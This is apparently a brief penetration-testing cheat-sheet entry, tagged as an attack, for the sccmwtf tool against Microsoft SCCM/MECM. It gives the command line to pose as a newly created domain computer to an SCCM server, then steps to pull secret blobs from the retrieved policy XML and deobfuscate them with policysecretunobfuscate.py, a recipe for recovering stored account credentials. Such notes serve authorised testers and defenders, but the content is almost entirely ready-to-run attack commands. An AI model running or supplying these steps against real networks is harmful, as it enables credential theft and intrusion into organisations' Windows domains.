# sccmwtf

% sccm, mecm
#plateform/linux  #target/remote  #cat/ATTACK 


## desc
```
https://github.com/xpn/sccmwtf
```

## request 
prerequisites create a computer with addcomputer.py 
```bash
sccmwtf.py <computer_name> <computer_fqdn> <sccm_fqdn> '<domain_fqdn>\<computer_name>$' <computer_password>
```

## decrypt
grep CDATA naapolicy.xml
```powershell
python3 policysecretunobfuscate.py <blob_hex_1>
python3 policysecretunobfuscate.py <blob_hex_2>
``` 